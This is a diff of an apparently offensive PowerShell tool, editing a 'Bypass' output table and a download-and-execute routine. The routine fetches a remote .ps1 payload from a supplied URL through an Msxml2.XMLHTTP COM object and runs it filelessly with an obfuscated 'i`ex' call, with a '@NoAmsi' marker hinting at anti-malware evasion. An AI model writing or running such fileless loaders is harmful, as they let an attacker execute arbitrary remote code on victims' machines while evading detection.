@@ -225,7 +225,7 @@ If($Action -ieq "Bypass")
                                  "Powershell version 2 not found in $Env:COMPUTERNAME!")|Out-Null
 
                #Display Output Table
-               $mytable|Format-List > $env:TMP\tbl.log
+               $mytable | Format-List > $env:TMP\tbl.log
                Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
                   Out-String -Stream | ForEach-Object {
                      $stringformat = If($_ -Match '(failed)$'){
@@ -1023,10 +1023,8 @@ If($PayloadURL -ne "false")
    #>
 
    #Parse URL data
+   $DomainName = $PayloadURL.Split('/')[2]
    $RawName = ($PayloadURL.Split('/')[-1]) -replace '.ps1',''
-   Write-Host "Download\Execute $RawName" -ForegroundColor Yellow
-   Write-Host "-------------------------" 
- 
 
    If($PayloadURL -iNotMatch '^[http(s)://]')
    {
@@ -1040,20 +1038,24 @@ If($PayloadURL -ne "false")
       #Wrong download fileformat syntax user input
       Write-Host "[error] -PayloadURL '<url>' only accepts script.PS1 file formats!" -ForegroundColor Red -BackgroundColor Black
       Write-Host "";Start-Sleep -Seconds 2;exit ## @NoAmsi    
-   }   
+   }
+
+   If($PayloadURL -iMatch '^(https://)')
+   {
+      $PortNumber = "445"
+   }
+   ElseIf($PayloadURL -iMatch '^(http://)')
+   {
+      $PortNumber = "80"
+   }
+
+   #Build Table display
+   Write-Host "Download\Execute '$RawName.ps1'" -ForegroundColor Yellow
+   Write-Host "* [connecting to] $DomainName TCP $PortNumber .." -ForegroundColor DarkCyan
+   Write-Host "     uri: $PayloadURL`n" -ForegroundColor DarkCyan 
 
    #Msxml2-Proxy-Downloader { FileLess }
-   $TORnetwork=New-Object -ComObject Msxml2.XMLHTTP;$TORnetwork.open('GET',"$PayloadURL",$false);$TORnetwork.send();i`ex $TORnetwork.responseText
-   Start-Sleep -Seconds 1 ## Give some time for ps1 to load proper!
-   If(Get-Module -ListAvailable -Name $RawName)
-   {
-      &"$RawName"
-      Write-Host ""
-   } 
-   Else
-   {
-      Write-Host "[error] fail to load $RawName into PS database!" -ForegroundColor Red -BackgroundColor Black
-      Write-Host ""
-   }
+   $TORnetwork=New-Object -ComObject Msxml2.XMLHTTP;$TORnetwork.open('GET',"$PayloadURL",$false);$TORnetwork.send();i`ex $TORnetwork.responseText;&"$RawName"
+   Write-Host ""
                        
 }
